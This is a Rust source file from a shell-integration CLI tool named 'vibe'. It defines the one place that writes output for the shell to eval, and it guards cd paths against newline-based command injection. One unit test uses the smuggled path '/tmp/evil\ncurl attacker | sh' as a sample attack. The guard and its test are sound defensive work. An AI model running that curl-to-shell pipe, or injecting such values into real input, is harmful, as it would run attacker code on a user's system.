//! The single stdout write point for the shell-eval contract.
//!
//! stdout is consumed verbatim by the shell wrapper (`eval "$(command vibe ...)"`),
//! so exactly one place writes it. An [`Outcome`] carries either a `cd_path`
//! (printed as `cd '<escaped>'`) or verbatim `stdout` text (the `shell-setup`
//! wrapper/completion). These are mutually exclusive by construction.

use vibe_core::commands::Outcome;
use vibe_core::shell::format_cd_command;
use vibe_core::VibeError;

/// Write an outcome's stdout payload (if any) to real stdout.
///
/// Security guard: if `cd_path` contains a `\n` or `\r`, refuse to print and
/// return an error instead. A newline would split the single `cd` line the
/// shell evals, letting an attacker-controlled path inject a second command.
pub fn write_outcome(outcome: &Outcome) -> Result<(), VibeError> {
    // `cd_path` and `stdout` are mutually exclusive by construction; assert it in
    // debug builds so a future `Outcome` constructor that sets both is caught
    // (the branch order below would otherwise silently drop `stdout`).
    debug_assert!(
        !(outcome.cd_path.is_some() && outcome.stdout.is_some()),
        "Outcome must not set both cd_path and stdout"
    );

    if let Some(path) = &outcome.cd_path {
        let has_newline = path.contains('\n') || path.contains('\r');
        if has_newline {
            return Err(VibeError::Worktree(
                "refusing to emit a cd path containing a newline".to_string(),
            ));
        }
        println!("{}", format_cd_command(path));
        return Ok(());
    }

    if let Some(text) = &outcome.stdout {
        // Verbatim: the text already carries its own trailing newline(s).
        print!("{text}");
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn rejects_cd_path_with_newline() {
        let outcome = Outcome::cd("/tmp/evil\ncurl attacker | sh");
        assert!(write_outcome(&outcome).is_err());
    }

    #[test]
    fn rejects_cd_path_with_carriage_return() {
        let outcome = Outcome::cd("/tmp/evil\rsomething");
        assert!(write_outcome(&outcome).is_err());
    }

    #[test]
    fn accepts_normal_cd_path() {
        // A clean path prints without error (output captured by the test harness).
        let outcome = Outcome::cd("/tmp/repo");
        assert!(write_outcome(&outcome).is_ok());
    }

    #[test]
    fn none_outcome_is_ok() {
        assert!(write_outcome(&Outcome::none()).is_ok());
    }

    #[test]
    fn stdout_outcome_is_ok() {
        assert!(write_outcome(&Outcome::stdout("vibe() { :; }\n")).is_ok());
    }
}
